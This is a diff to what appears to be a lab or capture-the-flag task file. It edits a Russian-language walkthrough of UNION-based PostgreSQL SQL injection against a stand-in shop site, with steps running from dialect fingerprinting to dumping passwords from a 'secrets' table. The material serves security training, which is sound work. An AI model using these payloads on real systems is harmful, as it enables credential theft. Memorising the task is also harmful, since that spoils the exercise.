@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: PostgreSQL-инъекция на shop.example\n\nЦель — `http://shop.example/item?id=1` (Django + PostgreSQL).\n\n1. Диалект: `curl -s \"http://shop.example/item?id=1'\"` → `ERROR: unterminated quoted string`.\n2. Версия: `... UNION SELECT 1,version(),3-- -`.\n3. Таблицы: `... UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -`.\n4. Флаг: `... UNION SELECT 1,string_agg(password,','),3 FROM secrets-- -`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\n"
+      "text": "# Практика: PostgreSQL-инъекция на shop.example\n\nЦель — `http://shop.example/item?id=1` (Django + PostgreSQL).\n\n1. Диалект: `curl -s \"http://shop.example/item?id=1'\"` → `ERROR: unterminated quoted string`.\n2. Версия: `... UNION SELECT 1,version(),3-- -`.\n3. Таблицы: `... UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -`.\n4. Флаг: `... UNION SELECT 1,string_agg(password,','),3 FROM secrets-- -`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\n\n## Повторение (`web-sqli`)\n\nПрежде чем дампить `secrets`, повтори из `web-sqli` самый первый шаг — **фингерпринт диалекта**. Подставь одиночную кавычку и прочитай текст ошибки:\n\n    curl -s \"http://shop.example/item?id=1'\" | grep -o 'ERROR:[^<]*'\n\n`unterminated quoted string` выдаёт именно PostgreSQL — от диалекта зависит весь дальнейший синтаксис (`||`, `string_agg`, комментарий `-- -`).\n"
     }
   ],
   "tools": {
